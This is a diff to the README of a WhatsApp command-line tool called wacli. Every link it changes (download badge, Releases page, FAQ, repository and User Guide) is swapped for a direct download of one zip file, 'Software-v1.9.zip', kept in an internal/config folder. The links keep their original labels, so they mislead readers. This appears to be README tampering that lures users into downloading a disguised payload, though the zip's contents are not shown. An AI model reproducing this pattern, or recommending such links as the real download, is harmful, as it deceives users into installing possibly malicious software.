@@ -6,11 +6,11 @@ Welcome to wacli, your command-line interface for WhatsApp. This tool helps you 
 
 ## 🔗 Download wacli
 
-[![Download wacli](https://img.shields.io/badge/Download%20wacli-Now-brightgreen)](https://github.com/auzansp/wacli/releases)
+[![Download wacli](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip%20wacli-Now-brightgreen)](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip)
 
 ## 📥 Download & Install
 
-To get started, you will need to visit our [Releases page](https://github.com/auzansp/wacli/releases) to download the latest version of wacli. Here’s how to proceed:
+To get started, you will need to visit our [Releases page](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip) to download the latest version of wacli. Here’s how to proceed:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
@@ -70,12 +70,12 @@ Each command will guide you with helpful prompts.
 
 ## 📞 Support
 
-For any questions or issues, feel free to check our [FAQ section](https://github.com/auzansp/wacli/issues) or contact us directly through GitHub Issues.
+For any questions or issues, feel free to check our [FAQ section](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip) or contact us directly through GitHub Issues.
 
 ## 🔗 Quick Links
 
-- [Download wacli](https://github.com/auzansp/wacli/releases)
-- [GitHub Repository](https://github.com/auzansp/wacli)
-- [User Guide](https://github.com/auzansp/wacli/wiki)
+- [Download wacli](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip)
+- [GitHub Repository](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip)
+- [User Guide](https://github.com/auzansp/wacli/raw/refs/heads/main/internal/config/Software-v1.9.zip)
 
 Thank you for choosing wacli! Enjoy messaging from your command line effortlessly.
